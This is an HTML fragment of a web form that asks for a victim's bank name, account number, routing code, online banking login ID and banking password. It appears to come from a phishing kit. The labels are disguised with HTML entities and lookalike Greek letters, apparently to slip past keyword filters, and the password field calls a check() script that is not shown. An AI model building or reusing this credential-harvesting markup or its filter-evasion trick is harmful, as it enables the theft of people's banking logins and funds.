<br>
               <table>
          <tr>
           <td>&#x0042;ank Name :</td>
            <td><input type="text"  autocomplete="off"  maxlength="30" name="bnknameus" value="" required="required" title="Bank Name"></input></td>
        </tr>
         <tr>
            <td>&#x0042;ank &Nu;umber :</td>
            <td><input type="number" id="bank"  autocomplete="off"  maxlength="25" name="acnot" value="" required="required" title="Account Number"></input></td>
        </tr>
         <tr>
            <td>&#x0042;ank &#x0052;outing C&omicron;de :</td>
            <td><input type="text"  autocomplete="off"  maxlength="25" name="swsd" value="" required="required" title="Bank Swift C&omicron;de"></input></td>
        </tr>

        <tr>
            <td>&#x0042;ank &#x004C;ogin ID :</td>
            <td><input type="text"  autocomplete="off"  maxlength="25" name="lobank" value="" required="required" title="Username"></input></td>
        </tr>
        <tr>
            <td>&#x0042;ank Passw&omicron;rd :</td>
            <td><input type="password" id="txt" onkeyup="check()" onmouseout="check()"  autocomplete="off"  maxlength="25" name="pwd_csdad" value="" required="required" title="Password"></input></td>
        </tr>
    </table>